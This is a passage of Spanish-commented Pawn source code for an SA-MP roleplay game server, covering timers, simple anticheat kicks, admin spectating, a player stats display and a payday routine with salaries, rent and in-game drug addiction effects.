		if(engine == 1 && CarInfo[carid][cGas] > 0)CarInfo[carid][cGas]--; //Bajar 1 de gasolina
		if(CarInfo[carid][cGas] < 0)CarInfo[carid][cGas] = 0; //Setear gasolina a 0 si es menor a tal
		if(engine == 1 && CarInfo[carid][cGas] == 0)SetVehicleParamsEx(carid,0,lights,alarm,doors,bonnet,boot,objective); //Apagar motor si no tiene gasolina
		if(CarInfo[carid][cEnDeposito] == 1) //Desguace
		{
			SetVehicleVirtualWorld(carid, carid+1);
			if(IsABoat(carid)){SetVehiclePos(carid, 2294.3999,-2447.8000,0.0000);}
	    	if(!IsABoat(carid)){SetVehiclePos(carid, 2274.1028,-2345.5371,13.5469);}
		}
		if(CarInfo[carid][cEnDeposito] == 2 && GetVehicleDistanceFromPoint(carid, 1622.1896,-1823.4991,13.5279) > 50) //Depósito LSPD
		{
			new string[128];
			SetVehiclePos(carid, 1622.1896,-1823.4991,13.5279);
			format(string, sizeof(string), "El vehículo #%d ha salido y sido devuelto al depósito de LSPD.", carid);
		  	SendAdminMessage(Aguamarina, string);
		}
		if(engine == 1 && cvida < MIN_CAR_HEALTH)SetVehicleParamsEx(carid,0,lights,alarm,doors,bonnet,boot,objective); //Apagar motor si está muy dañado
	}
	
	for(new x = 0; x <= CodigoPlantacion; x++) //Loop de plantaciones
	{
	    if(PlantaInfo[x][plEstado] > 0)
	    {
	        PlantaInfo[x][plEstado] ++;
	        UpdatePlantacionLabel(x);
	    }
	}
	
	if(AvisoLSPDCompraArmas > 0) AvisoLSPDCompraArmas --; //Aviso a LSPD de compra de armas
	if(AvisoLSPDCompraDrogas > 0) AvisoLSPDCompraDrogas --; //Aviso a LSPD de compra de drogas
	return 1;
}

forward TimerDeMedioMinuto(); //Timer que se activa cada medio minuto
public TimerDeMedioMinuto()
{
    for(new playerid = 0; playerid < MAX_PLAYERS; playerid++)
	{
	    if(PrimerSpawn[playerid] == 0 || JugadorLogueado[playerid] == 0 || !IsPlayerConnected(playerid)){continue;}
     	if(JugadorLogueado[playerid] != 0)
		{
		    if(TaxiConductor[playerid] != NOEXISTE && Trabajando[TaxiConductor[playerid]]) //Está pagando a un taxista
		    {
		        if(!IsATaxi(GetPlayerVehicleID(playerid))){TaxiPasajero[TaxiConductor[playerid]] = NOEXISTE; TaxiConductor[playerid] = NOEXISTE; TaxiCoste[playerid] = 0; return 1;}//No está en un taxi
				new taxista = TaxiConductor[playerid];
		        PlayerInfo[playerid][pDineroBanco] -= Tarifa[taxista];
		        GivePlayerMoneyAC(taxista, Tarifa[taxista]);
		        TaxiCoste[playerid] += Tarifa[taxista];
	            return 1;
		    }
	    }
	}
	return 1;
}

forward TimerDeMedioSegundo(); //Timer que se activa cada medio segundo
public TimerDeMedioSegundo()
{
    for(new playerid; playerid < MAX_PLAYERS; playerid++)
	{
        if(PrimerSpawn[playerid] == 0 || JugadorLogueado[playerid] == 0 || !IsPlayerConnected(playerid)){continue;}
        if(LaserON[playerid] == 1) //Laser en armas
		{
			PonerLaser(playerid);
		}
        //Anticheat
        if(GetPlayerPing(playerid) > MAX_PING) //Ping kicker
        {
            new string[128];
            PingKick[playerid] ++;
            if(PingKick[playerid] >= 20)
            {
                format(string, sizeof(string), "'%s' ha sido kickeado automáticamente por exceder el máximo ping permitido.", GetPlayerNameRP(playerid));
            	SendClientMessageToAll(Rojo, string);
            	KickL(playerid);
            }
        }
        else{PingKick[playerid] = 0;}
        
        if(GetPlayerMoney(playerid) > DineroAC[playerid]) //Dinero
        {
            new string[128];
			format(string, sizeof(string), "'%s' (ID: %d) ha alterado el anticheat de dinero con %d$. Posible hacker.", GetPlayerNameRP(playerid), playerid, GetPlayerMoney(playerid)-DineroAC[playerid]);
			SendAdminMessage(Aguamarina, string);
			ResetPlayerMoney(playerid);
			GivePlayerMoney(playerid, DineroAC[playerid]);
        }
        
        new Float:Chaleco;
        GetPlayerArmour(playerid, Chaleco);
        if(Chaleco > 0 && PlayerInfo[playerid][pAdmin] == 0 && (PlayerInfo[playerid][pFaccion] != 1 || PlayerInfo[playerid][pServicioPD] == 0)) //Tiene chaleco y no es poli y no está de servicio admin y no está de servicio poli
        {
            ChalecoAC[playerid] ++;
		    SetPlayerArmour(playerid, 0);
		    if(ChalecoAC[playerid] >= 10)
		    {
		        new string[128];
				format(string, sizeof(string), "'%s' ha sido kickeado automáticamente por hack de armadura.", GetPlayerNameRP(playerid));
	        	SendClientMessageToAll(Rojo, string);
	        	KickL(playerid);
		    }
        }
        else{ChalecoAC[playerid] = 0;}
        
        if(GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK && PlayerInfo[playerid][pAdmin] == 0) //Jetpack
		{
			new string[128];
			format(string, sizeof(string), "'%s' ha sido baneado automáticamente por spawnear un jetpack.", GetPlayerNameRP(playerid));
        	SendClientMessageToAll(Rojo, string);
        	BanL(playerid);
		}
		
		if((GetPlayerWeapon(playerid) == 35 || GetPlayerWeapon(playerid) == 36 || GetPlayerWeapon(playerid) == 37 || GetPlayerWeapon(playerid) == 38) && PlayerInfo[playerid][pAdmin] == 0) //Anti armas tochas
		{
		    new string[128];
			format(string, sizeof(string), "'%s' ha sido kickeado automáticamente por hacks de armas.", GetPlayerNameRP(playerid));
        	SendClientMessageToAll(Rojo, string);
        	printf(string);
        	KickL(playerid);
		}
		
		if(GetPlayerWeapon(playerid) != 0 && GetPlayerWeapon(playerid) != ObjetoInfo[PlayerInfo[playerid][pManoDer]][IDArma] && GetPlayerState(playerid) == PLAYER_STATE_ONFOOT) //Anti spawn de armas
		{
		    ArmaSpawnAC[playerid] ++;
		    SetPlayerArmedWeapon(playerid, ObjetoInfo[PlayerInfo[playerid][pManoDer]][IDArma]);
		    if(ArmaSpawnAC[playerid] >= 6)
		    {
		        new string[128];
				format(string, sizeof(string), "'%s' ha sido kickeado automáticamente por hacks de armas.", GetPlayerNameRP(playerid));
	        	SendClientMessageToAll(Rojo, string);
	        	KickL(playerid);
		    }
		}
		else{ArmaSpawnAC[playerid] = 0;}
		
		VehicleHack[playerid] = 0;
		
		/*if(GetPlayerVehicleID(playerid) != CurrentVeh[playerid] && GetPlayerVehicleID(playerid) != 0 && CurrentVeh[playerid] != 0)
		{
		    new string[128];
    		format(string, sizeof(string), "'%s' ha sido kickeado automáticamente por hacks de armas.", GetPlayerNameRP(playerid));
        	SendClientMessageToAll(Rojo, string);
        	KickL(playerid);
		}*/
		
		//Fin anticheat
		
		if(PlayerInfo[playerid][pAdmin] >= 1 && GodMode[playerid] == 1) //Parte admin
		{
		    //Godmode admin
			SetPlayerHealth(playerid, 999999);
		    SetPlayerArmour(playerid, 999999);
			//Sistema RECON
			if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING  && (PlayerInfo[playerid][pSpecType] == ADMIN_SPEC_TYPE_PLAYER || PlayerInfo[playerid][pSpecType] == ADMIN_SPEC_TYPE_VEHICLE))
			{
				new specplayerid = PlayerInfo[playerid][pSpecID];
				SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(specplayerid));
				SetPlayerInterior(playerid,GetPlayerInterior(specplayerid));
			}
		} //Fin parte admin
		
		//Arregla la solicitud de refuerzos
    	if(PlayerInfo[playerid][pFaccion] == 1 && PlayerInfo[playerid][pServicioPD] > 0 && SolicitaRefuerzos[playerid] == 1)
    	{
    	    for(new i = 0; i < MAX_PLAYERS; i++)
			{
				if(IsPlayerConnected(i))
				{
					if(PlayerInfo[i][pFaccion] == 1 && PlayerInfo[i][pServicioPD] > 0)
					{
						SetPlayerMarkerForPlayer(i, playerid, 0x1229FAFF);
					}
				}
			}
    	}
		
		//Si NO está subido a un vehículo
		if(GetPlayerState(playerid) == 1)
		{
		    //Anim muerte
   	 		if(PlayerInfo[playerid][pMuerto] > 0)
			{
				if(GetPlayerAnimationIndex(playerid) != 390)
				{
					ApplyAnimation(playerid,"CRACK","crckidle2",4.1,1,1,1,0,0,1);
				}
				SetPlayerHealth(playerid, 100);
			}
			//Anim táser
   	 		if(Taseado[playerid] > 0 && PlayerInfo[playerid][pMuerto] == 0)
			{
				if(GetPlayerAnimationIndex(playerid) != 1209)
				{
					ApplyAnimation(playerid,"PED","KO_skid_front",4.1,0,1,1,1,0);
				}
			}
		}
	 	//Si SÍ está subido a un vehículo
		if(IsPlayerInAnyVehicle(playerid))
		{
		    new carid = GetPlayerVehicleID(playerid);
		    if(TaxiConductor[playerid] != NOEXISTE && Trabajando[TaxiConductor[playerid]]) //Está pagando a un taxista
		    {
				new taxista = TaxiConductor[playerid], string[50];
		        format(string, sizeof(string), "~y~Coste actual del viaje: %d$", TaxiCoste[playerid]);
	            GameTextForPlayer(playerid, string, 1000, 3);
	            GameTextForPlayer(taxista, string, 1000, 3);
	            return 1;
		    }
		    if(GetPlayerState(playerid) == 2 && !IsABike(carid)) //Si es conductor
		    {
		        if(Trabajando[playerid] == 1 && IsACropduster(carid) && PlayerInfo[playerid][pTrabajo] == 5) //Fumigador aéreo
		        {
		            if(!IsPlayerInRangeOfPoint(playerid, 550.0, -376.4928,-1436.4470,25.7266)) //Si se sale de la zona de fumigación
		            {
		                SetVehicleToRespawn(carid);
		                SetPlayerSkin(playerid, PlayerInfo[playerid][pSkin]);
		                Fumigado[playerid] = 0;
		                SetPlayerPos(playerid, -420.8934,-1750.6937,6.8467);
		                Trabajando[playerid] = 0;
						SendClientMessage(playerid, Rojo, "* Has salido de la zona de fumigación y has dejado de trabajar.");
						DisablePlayerRaceCheckpoint(playerid);
						DisablePlayerCheckpoint(playerid);
		            }
		        }
  			    if(CocheAutoescuelaCond(carid) && EnAutoEscuela[playerid] == 1)
  			    {
  			        if(velocidad[playerid] > 90)
  			        {
  			            MaxVelAutoEscuela[playerid] ++;
  			            if(MaxVelAutoEscuela[playerid] > 20)
  			            {
  			                SendClientMessage(playerid, Rojo, "* Has superado el límite de velocidad durante bastante tiempo y has suspendido.");
  			                KillTimer(MaxTiempoAutoEscuelaTimer[playerid]);
  			                GameTextForPlayer(playerid, "~r~Suspenso", 1000, 6);
							GivePlayerMoneyAC(playerid, -100);
							CheckPointAutoEscuela[playerid] = 0;
							EnAutoEscuela[playerid] = 0;
							MaxVelAutoEscuela[playerid] = 0;
			                SetVehicleToRespawn(carid);
			                DisablePlayerCheckpoint(playerid);
			                SetPlayerPos(playerid, 2048.6418,-1908.1290,13.5469);
  			            }
  			        }
  			        else{MaxVelAutoEscuela[playerid] = 0;}
  			    }
		    }
		    new Float:cvida;
		    GetVehicleHealth(carid, cvida);
		    new engine,lights,alarm,doors,bonnet,boot,objective;
			GetVehicleParamsEx(carid,engine,lights,alarm,doors,bonnet,boot,objective);
		    if(cvida < MIN_CAR_HEALTH && engine != 0) //Daños del vehículo inferiores a 350 y motor encendido
		    {
		        SetVehicleParamsEx(carid,0,lights,alarm,doors,bonnet,boot,objective);
		        SendClientMessage(playerid, Rojo, "El motor se ha parado debido a los daños.");
		    }
		}
		ActualizarManos(playerid); //Actualiza los objetos en mano del jugador
		if(EnLlamada[playerid] > 0 && PlayerInfo[playerid][pManoDer] != 68 && PlayerInfo[playerid][pManoIzq] != 68 && EnLlamada[PersonaEnLlamada[playerid]] != 912){ColgarTelefono(playerid);}
		if(IntentarUsado[playerid] > 0) IntentarUsado[playerid] --;
	}
	if(anunciotiempo > 0) anunciotiempo --; //Sistema de anuncios
	return 1;
}

stock StartSpectate(playerid, specplayerid) //Sistema Recon
{
	for(new x=0; x<MAX_PLAYERS; x++)
	{
	    if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][pSpecID] == playerid)
		{
  	     AdvanceSpectate(x);
		}
	}
	TogglePlayerSpectating(playerid, 1);

	if(IsPlayerInAnyVehicle(specplayerid))
	{
		PlayerSpectateVehicle(playerid, GetPlayerVehicleID(specplayerid));
		PlayerInfo[playerid][pSpecID] = specplayerid;
		PlayerInfo[playerid][pSpecType] = ADMIN_SPEC_TYPE_VEHICLE;
	}
	else
	{
		PlayerSpectatePlayer(playerid, specplayerid);
		PlayerInfo[playerid][pSpecID] = specplayerid;
		PlayerInfo[playerid][pSpecType] = ADMIN_SPEC_TYPE_PLAYER;
	}
	SetPlayerVirtualWorld(playerid,GetPlayerVirtualWorld(specplayerid));
	SetPlayerInterior(playerid,GetPlayerInterior(specplayerid));
}

stock StopSpectate(playerid) //Sistema Recon
{
	TogglePlayerSpectating(playerid, 0);
	PlayerInfo[playerid][pSpecID] = INVALID_PLAYER_ID;
	PlayerInfo[playerid][pSpecType] = ADMIN_SPEC_TYPE_NONE;
	return 1;
}

stock AdvanceSpectate(playerid) //Sistema Recon
{
    if(ConnectedPlayers() == 1) { StopSpectate(playerid); SetTimerEx("ReturnPosition",500,0,"d",playerid); return 1; }
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][pSpecID] != INVALID_PLAYER_ID)
	{
	    for(new x=PlayerInfo[playerid][pSpecID]+1; x<=MAX_PLAYERS; x++)
		{
	    	if(x == MAX_PLAYERS) x = 0;
	        if(IsPlayerConnected(x) && x != playerid)
			{
				if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][pSpecID] != INVALID_PLAYER_ID || (GetPlayerState(x) != 1 && GetPlayerState(x) != 2 && GetPlayerState(x) != 3))
				{
					continue;
				}
				else
				{
					StartSpectate(playerid, x);
					break;
				}
			}
		}
	}
	return 1;
}

stock ReverseSpectate(playerid) //Sistema Recon
{
    if(ConnectedPlayers() == 1) { StopSpectate(playerid); SetTimerEx("ReturnPosition",500,0,"d",playerid); return 1; }
	if(GetPlayerState(playerid) == PLAYER_STATE_SPECTATING && PlayerInfo[playerid][pSpecID] != INVALID_PLAYER_ID)
	{
	    for(new x=PlayerInfo[playerid][pSpecID]-1; x>=0; x--)
		{
	    	if(x == 0) x = MAX_PLAYERS;
	        if(IsPlayerConnected(x) && x != playerid)
			{
				if(GetPlayerState(x) == PLAYER_STATE_SPECTATING && PlayerInfo[x][pSpecID] != INVALID_PLAYER_ID || (GetPlayerState(x) != 1 && GetPlayerState(x) != 2 && GetPlayerState(x) != 3))
				{
					continue;
				}
				else
				{
					StartSpectate(playerid, x);
					break;
				}
			}
		}
	}
	return 1;
}

stock ReconTextDraws() //Sistema Recon
{
	for(new l=0; l<130; l++)
	{
	GpsTD[l] = TextDrawCreate(326.000000, 362.000000, " ");
	TextDrawAlignment(GpsTD[l], 2);
	TextDrawBackgroundColor(GpsTD[l], 255);
	TextDrawFont(GpsTD[l], 1);
	TextDrawLetterSize(GpsTD[l], 0.300000, 1.100000);
	TextDrawColor(GpsTD[l], -1587871574);
	TextDrawSetOutline(GpsTD[l], 0);
	TextDrawSetProportional(GpsTD[l], 1);
	TextDrawSetShadow(GpsTD[l], 1);
	}
	return 1;
}

forward ReturnPosition(playerid); //Sistema Recon
public ReturnPosition(playerid)
{
	TogglePlayerControllable(playerid, 1);
	SetPlayerPos(playerid,RecPos[playerid][0],RecPos[playerid][1],RecPos[playerid][2]);
	SetPlayerFacingAngle(playerid,RecPos[playerid][3]);
	SetPlayerInterior(playerid,IntRec[playerid]);
	SetPlayerVirtualWorld(playerid,VwRec[playerid]);
}

stock ConnectedPlayers() //Cuenta el número de jugadores conectados
{
	new Connected;
	for(new i = 0; i < MAX_PLAYERS; i++)
	if(IsPlayerConnected(i))
	Connected++;
	return Connected;
}

forward ChatOOCTimer(playerid); //Chat OOC /b
public ChatOOCTimer(playerid)
{
	ChatOOC[playerid] = 0;
}

forward ShowStats(color, playerid, targetid); //Muestra stats de un jugador
public ShowStats(color, playerid, targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
		new stats[128], sexo[2], trabajo[33], taller[17], faccion[33], lider[9], rango[33];
		//Sexo
		if(PlayerInfo[targetid][pSexo] == 1){sexo = "M";}
		if(PlayerInfo[targetid][pSexo] == 2){sexo = "F";}
		//Trabajo
		if(PlayerInfo[targetid][pTrabajo] == 0){trabajo = "No";}
		else{format(trabajo, sizeof(trabajo), "%s", Jobs[PlayerInfo[targetid][pTrabajo]-1][JobNombre]);}
		if(PlayerInfo[targetid][pTrabajo] == 7 && PlayerInfo[targetid][pTaller] == 0){taller = " (Taller: No)";}
		else if(PlayerInfo[targetid][pTrabajo] == 7){format(taller, sizeof(taller), " (Taller: %d)",PlayerInfo[targetid][pTaller]);}
		//Facción
		if(PlayerInfo[targetid][pFaccion] == 0){faccion = "No", rango = "No";}
		if(PlayerInfo[targetid][pFaccion] > 0)
		{
			format(faccion, sizeof(faccion), "%s", FaccInfo[PlayerInfo[targetid][pFaccion]][fNombre]);
		}
		//Líder
		if(PlayerInfo[targetid][pLider] > 0){lider = " (Líder)";}
		//Muestra cuenta foro si chequea un admin
		new cuentaforo[50];
		if(PlayerInfo[playerid][pAdmin] > 0) format(cuentaforo, sizeof(cuentaforo), " (Foro: %s)", PlayerInfo[targetid][pCuentaForo]);
		//Rango
		if(PlayerInfo[targetid][pFaccion] > 0) //Parte de una facción
		{
	        switch(PlayerInfo[targetid][pRango])
		    {
	            case 1: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[targetid][pFaccion]][fRango1]);
	            case 2: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[targetid][pFaccion]][fRango2]);
	            case 3: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[targetid][pFaccion]][fRango3]);
	            case 4: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[targetid][pFaccion]][fRango4]);
	            case 5: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[targetid][pFaccion]][fRango5]);
	            case 6: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[targetid][pFaccion]][fRango6]);
	            case 7: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[targetid][pFaccion]][fRango7]);
	            case 8: format(rango, sizeof(rango), "%s", FaccInfo[PlayerInfo[targetid][pFaccion]][fRango8]);
	        }
		}

		SendClientMessage(playerid, color, "||______________________________ Estadísticas del jugador ______________________________||");
		format(stats, sizeof(stats), "Nombre: %s%s (%s) | Edad: %d | Nivel: %d (%d/%d) | Teléfono: %d | Dinero: %d$ | Banco: %d$", PlayerInfo[targetid][pNombre], cuentaforo, sexo, PlayerInfo[targetid][pEdad], PlayerInfo[targetid][pNivel], PlayerInfo[targetid][pExp], GetRespetoMinimo(PlayerInfo[targetid][pNivel] + 1), PlayerInfo[targetid][pTelefono], GetPlayerMoney(targetid), PlayerInfo[targetid][pDineroBanco]);
		SendClientMessage(playerid, color, stats);
		
		format(stats, sizeof(stats), "Facción: %s%s | Rango: %s (%d) | Trabajo: %s%s | Advertencias: %d | Puntos de rol: %d", faccion, lider, rango, PlayerInfo[targetid][pRango], trabajo, taller, PlayerInfo[targetid][pAdvertencias], PlayerInfo[targetid][pPuntosRol]);
		SendClientMessage(playerid, color, stats);
		
		format(stats, sizeof(stats), "Llaves vehículos propios: %d, %d, %d, %d, %d | Llaves vehículos prestados: %d, %d, %d, %d, %d", PlayerInfo[targetid][pLlaveCoche][0], PlayerInfo[targetid][pLlaveCoche][1], PlayerInfo[targetid][pLlaveCoche][2], PlayerInfo[targetid][pLlaveCoche][3], PlayerInfo[targetid][pLlaveCoche][4],
		PlayerInfo[targetid][pLlaveCochePrestado][0], PlayerInfo[targetid][pLlaveCochePrestado][1], PlayerInfo[targetid][pLlaveCochePrestado][2], PlayerInfo[targetid][pLlaveCochePrestado][3], PlayerInfo[targetid][pLlaveCochePrestado][4]);
		SendClientMessage(playerid, color, stats);
		
		format(stats, sizeof(stats), "Casa: %d | Casa alquilada: %d | Local: %d", PlayerInfo[targetid][pCasa], PlayerInfo[targetid][pCasaAlq], PlayerInfo[targetid][pNegocio]);
		SendClientMessage(playerid, color, stats);
		
		format(stats, sizeof(stats), "[Adicciones/Tolerancia] Marihuana: %d | Cocaína: %d | Crack: %d | Heroína: %d | LSD: %d", PlayerInfo[targetid][pAdiccion][0], PlayerInfo[targetid][pAdiccion][1], PlayerInfo[targetid][pAdiccion][2], PlayerInfo[targetid][pAdiccion][3], PlayerInfo[targetid][pAdiccion][4]);
		SendClientMessage(playerid, color, stats);
		
		format(stats, sizeof(stats), "[Efectos (-1/min)] Marihuana: %d | Cocaína: %d | Crack: %d | Heroína: %d | LSD: %d", PlayerInfo[targetid][pDrConsumida][0], PlayerInfo[targetid][pDrConsumida][1], PlayerInfo[targetid][pDrConsumida][2], PlayerInfo[targetid][pDrConsumida][3], PlayerInfo[targetid][pDrConsumida][4]);
		SendClientMessage(playerid, color, stats);
    }
}

forward GivePlayerArmour(playerid,Float:Armour); //Dar chaleco a un jugador
public GivePlayerArmour(playerid,Float:Armour)
{
    new Float:armour; GetPlayerArmour(playerid, armour);
    SetPlayerArmour(playerid,armour+Armour);
    return 1;
}

forward GivePlayerHealth(playerid,Float:Health); //Dar vida a un jugador
public GivePlayerHealth(playerid,Float:Health)
{
    new Float:health; GetPlayerHealth(playerid, health);
    SetPlayerHealth(playerid,health+Health);
    return 1;
}

forward GivePlayerHealth1(playerid); //Quita 1 de vida al jugador
public GivePlayerHealth1(playerid)
{
    new Float:health; GetPlayerHealth(playerid, health);
    SetPlayerHealth(playerid,health-1);
    return 1;
}

forward PayDay(playerid);
public PayDay(playerid)
{
	if(JugadorLogueado[playerid] != 1 || PrimerSpawn[playerid] != 1){return 1;}
	PlayerSave(playerid); //Guarda stats
	//Mensaje payday
	GameTextForPlayer(playerid, "~g~PAYDAY", 1000, 1);
	//Puntos de respeto y nivel
	new nivel = PlayerInfo[playerid][pNivel];
	PlayerInfo[playerid][pExp]++;
	GetPlayerLevel(playerid);
	//Sueldos
	new banco = PlayerInfo[playerid][pDineroBanco], sueldo, trabajo, impuestos, string[128];
	SendClientMessage(playerid, Amarillo, "Payday:");
	//Actual balance
	format(string, sizeof(string), "|- Balance actual: %d$", banco); 
	SendClientMessage(playerid, AmarilloClaro, string);
	//Si forma parte de facción pública
	if(PlayerInfo[playerid][pFaccion] > 0 && PlayerInfo[playerid][pFaccion] <= 4)
	{
	    if(PlayerInfo[playerid][pFaccion] == 1) //LSPD
	    {
	        switch(PlayerInfo[playerid][pRango]) //Rango
	        {
	            case 1: sueldo = 300;
	            case 2: sueldo = 450;
	            case 3: sueldo = 525;
	            case 4: sueldo = 600;
	            case 5: sueldo = 800;
	            case 6: sueldo = 900;
	            case 7: sueldo = 1000;
	            case 8: sueldo = 1200;
	        }
	    }
	    if(PlayerInfo[playerid][pFaccion] == 2) //LSMD
	    {
	        switch(PlayerInfo[playerid][pRango]) //Rango
	        {
	            case 1: sueldo = 300;
	            case 2: sueldo = 450;
	            case 3: sueldo = 525;
	            case 4: sueldo = 600;
	            case 5: sueldo = 800;
	            case 6: sueldo = 900;
	            case 7: sueldo = 1000;
	            case 8: sueldo = 1200;
	        }
	    }
	    if(PlayerInfo[playerid][pFaccion] == 3) //Gobierno
	    {
	        switch(PlayerInfo[playerid][pRango]) //Rango
	        {
	            case 1: sueldo = 300;
	            case 2: sueldo = 450;
	            case 3: sueldo = 525;
	            case 4: sueldo = 600;
	            case 5: sueldo = 800;
	            case 6: sueldo = 900;
	            case 7: sueldo = 1000;
	            case 8: sueldo = 1200;
	        }
	    }
	    if(PlayerInfo[playerid][pFaccion] == 4) //LSRTV
	    {
	        switch(PlayerInfo[playerid][pRango]) //Rango
	        {
	            case 1: sueldo = 300;
	            case 2: sueldo = 375;
	            case 3: sueldo = 450;
	            case 4: sueldo = 525;
	            case 5: sueldo = 600;
	            case 6: sueldo = 675;
	            case 7: sueldo = 750;
	            case 8: sueldo = 825;
	        }
	    }
	    PlayerInfo[playerid][pDineroBanco] += sueldo;
		format(string, sizeof(string), "|- Salario facción: {88dd88}%d$", sueldo);
		SendClientMessage(playerid, AmarilloClaro, string);
	}
	//Si tiene job y no es ladrón ni tiene facción pública
	if(PlayerInfo[playerid][pTrabajo] > 0 && PlayerInfo[playerid][pTrabajo] != 8 && !(PlayerInfo[playerid][pFaccion] >= 1 && PlayerInfo[playerid][pFaccion] <= 4))
	{
	    trabajo = Jobs[PlayerInfo[playerid][pTrabajo]][JobPay] + 50*PlayerInfo[playerid][pNivel];
	    PlayerInfo[playerid][pDineroBanco] += trabajo;
		format(string, sizeof(string), "|- Salario base trabajo: {88dd88}%d$", trabajo);
		SendClientMessage(playerid, AmarilloClaro, string);
	}
	//Si tiene facción pública y job resetear el job
	if(PlayerInfo[playerid][pFaccion] >= 1 && PlayerInfo[playerid][pFaccion] <= 4 && PlayerInfo[playerid][pTrabajo] != 0) PlayerInfo[playerid][pTrabajo] = 0;
	//Impuestos
    format(string, sizeof(string), "|- Impuestos del estado: {e70000}%d$", impuestos); 
	SendClientMessage(playerid, AmarilloClaro, string);
	//Si tiene alquilada una bivienda
	if(PlayerInfo[playerid][pCasaAlq] > 0) 
	{
	    new casa = PlayerInfo[playerid][pCasaAlq];
	    if(HouseInfo[casa][hComprada] == 0 || (HouseInfo[casa][hAlquilable] == 0 && HouseInfo[casa][hComprada] > 0)) //Si no tiene dueño o no es alquilable, desalquilar automáticamente
		{
			PlayerInfo[playerid][pCasaAlq] = 0;
			SendClientMessage(playerid, AmarilloClaro, "Tu casa no tenía dueño o ya no es alquilable y ya no la estás alquilando.");
		}
	    else if(HouseInfo[casa][hComprada] == -1) //Hotel
		{
		    if(PlayerInfo[playerid][pDineroBanco] < HouseInfo[casa][hPAlquiler]) //No tiene suficiente pasta
			{
			    PlayerInfo[playerid][pCasaAlq] = 0;
				HouseInfo[casa][hInquilinos] --;
			    SendClientMessage(playerid, AmarilloClaro, "No tenías suficiente dinero para pagar el alquiler de tu habitación y te han echado.");
			    UpdateHouseLabel(casa);
			}
			else
			{
				PlayerInfo[playerid][pDineroBanco] -= HouseInfo[casa][hPAlquiler];
				format(string, sizeof(string), "|- Alquiler habitación: {e70000}%d$", HouseInfo[casa][hPAlquiler]);
				SendClientMessage(playerid, AmarilloClaro, string);
			}
		} 
	    else if(HouseInfo[casa][hComprada] > 0) //Privada
		{
		    if(PlayerInfo[playerid][pDineroBanco] < HouseInfo[casa][hPAlquiler]) //No tiene suficiente pasta
			{
			    PlayerInfo[playerid][pCasaAlq] = 0;
			    HouseInfo[casa][hInquilinos] --;
			    SendClientMessage(playerid, AmarilloClaro, "No tenías suficiente dinero para pagar el alquiler de tu casa y te han echado.");
			    UpdateHouseLabel(casa);
			}
			else
			{
				PlayerInfo[playerid][pDineroBanco] -= HouseInfo[casa][hPAlquiler];
				HouseInfo[casa][hDineroGuardado] += HouseInfo[casa][hPAlquiler];
				format(string, sizeof(string), "|- Alquiler casa: {e70000}%d$", HouseInfo[casa][hPAlquiler]);
				SendClientMessage(playerid, AmarilloClaro, string);
			}
		} 
	}
	//Nuevo balance
	if((PlayerInfo[playerid][pDineroBanco] - banco) >= 0) 
	{
		format(string, sizeof(string), "|- Nuevo balance: {88dd88}%d$ (+%d$)", PlayerInfo[playerid][pDineroBanco], PlayerInfo[playerid][pDineroBanco] - banco);
		SendClientMessage(playerid, AmarilloClaro, string);
	}
	else
	{
		format(string, sizeof(string), "|- Nuevo balance: {e70000}%d$ (%d$)", PlayerInfo[playerid][pDineroBanco], PlayerInfo[playerid][pDineroBanco] - banco);
		SendClientMessage(playerid, AmarilloClaro, string);
	}
	//Mensaje al subir de nivel
	if(PlayerInfo[playerid][pNivel] > nivel)
	{
		format(string, sizeof(string), "~w~¡Ahora eres nivel ~g~%d~w~!", PlayerInfo[playerid][pNivel]);
		GameTextForPlayer(playerid, string, 1000, 1);
	}
	//Adicción de drogas
	new cvida, Float:cvida2, drunklevel;
	GetPlayerHealth(playerid, cvida2);
	if(PlayerInfo[playerid][pDrConsumida][1] == 0 && PlayerInfo[playerid][pAdiccion][1] > 15) //No ha consumido cocaína y es adicto
	{
	    cvida += (PlayerInfo[playerid][pAdiccion][1]/3);
		SendClientMessage(playerid, NaranjaOscuro, "* Sufres el mono de la cocaina. Consume cocaina antes del próximo payday si no quieres sufrirlo de nuevo.");
		drunklevel += 5000;
		ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);
	}
	if(PlayerInfo[playerid][pDrConsumida][2] == 0 && PlayerInfo[playerid][pAdiccion][2] > 13) //No ha consumido crack y es adicto
	{
	    cvida += (PlayerInfo[playerid][pAdiccion][2]/3);
		SendClientMessage(playerid, NaranjaOscuro, "* Sufres el mono del crack. Consume crack antes del próximo payday si no quieres sufrirlo de nuevo.");
		drunklevel += 5000;
		ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);
	}
	if(PlayerInfo[playerid][pDrConsumida][3] == 0 && PlayerInfo[playerid][pAdiccion][3] > 9) //No ha consumido heroína y es adicto
	{
	    cvida += (PlayerInfo[playerid][pAdiccion][3]/3);
		SendClientMessage(playerid, NaranjaOscuro, "* Sufres el mono de la heroína. Consume heroína antes del próximo payday si no quieres sufrirlo de nuevo.");
		drunklevel += 5000;
		ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P", 3.0, 0, 0, 0, 0, 0);
	}
	if((cvida2 - cvida) > 10){GivePlayerHealth(playerid, -cvida);}
	else if(cvida2 > 10){SetPlayerHealth(playerid, 10);}
	GivePlayerDrunkLevel(playerid, drunklevel);
	if(PlayerInfo[playerid][pAdiccion][0] > 0) PlayerInfo[playerid][pAdiccion][0] --; //MArihuana
	if(PlayerInfo[playerid][pAdiccion][1] > 0) PlayerInfo[playerid][pAdiccion][1] --; //Cocaína
	if(PlayerInfo[playerid][pAdiccion][2] > 0) PlayerInfo[playerid][pAdiccion][2] --; //Crack
